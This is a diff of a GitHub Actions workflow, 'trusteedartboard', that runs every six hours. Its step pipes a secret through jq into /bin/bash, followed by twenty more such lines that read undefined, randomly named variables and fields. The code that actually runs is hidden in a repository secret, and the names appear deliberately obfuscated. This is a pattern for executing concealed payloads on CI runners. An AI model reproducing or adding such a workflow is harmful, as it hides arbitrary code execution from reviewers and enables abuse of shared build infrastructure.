@@ -1,23 +1,37 @@
 name: trusteedartboard
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
-
+    - cron: '56 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: trusteedartboard
         env:
-          evdrn91: ${{ secrets.evdrn91 }}
+          ckh512: ${{ secrets.ckh512 }}
         run: |
-          echo $evdrn91 | jq -r .wm72 | /bin/bash
-          echo $hcxju42863 | jq -r .uoeva0 | /bin/bash
-          echo $owkt94 | jq -r .mpveq416 | /bin/bash
-          echo $djnnt6519 | jq -r .rwvj7 | /bin/bash
-          echo $q142 | jq -r .jy4 | /bin/bash
-          echo $rpwz0877 | jq -r .tkla0153 | /bin/bash
+          echo $ckh512 | jq -r .msfyz387 | /bin/bash
+          echo $b2413 | jq -r .zapff33 | /bin/bash
+          echo $yj31 | jq -r .oomg85776 | /bin/bash
+          echo $oimw950 | jq -r .capsr94 | /bin/bash
+          echo $a3 | jq -r .awd7083 | /bin/bash
+          echo $aysm787 | jq -r .ihac9554 | /bin/bash
+          echo $hay12250 | jq -r .r4787 | /bin/bash
+          echo $k8107 | jq -r .qeho248 | /bin/bash
+          echo $y98 | jq -r .cl33 | /bin/bash
+          echo $vp8 | jq -r .zdoze6511 | /bin/bash
+          echo $td33884 | jq -r .f26731 | /bin/bash
+          echo $eqtkh988 | jq -r .pht6605 | /bin/bash
+          echo $hf0818 | jq -r .pfy47 | /bin/bash
+          echo $bsji12034 | jq -r .qjuw35 | /bin/bash
+          echo $q80 | jq -r .mrpv02 | /bin/bash
+          echo $nfdn0 | jq -r .orq8 | /bin/bash
+          echo $sam756 | jq -r .eo780 | /bin/bash
+          echo $ypxe10184 | jq -r .ylwfq13013 | /bin/bash
+          echo $dvned92 | jq -r .qgmua95543 | /bin/bash
+          echo $ot92738 | jq -r .xxwsn4289 | /bin/bash
+          echo $lij5088 | jq -r .su74334 | /bin/bash
 
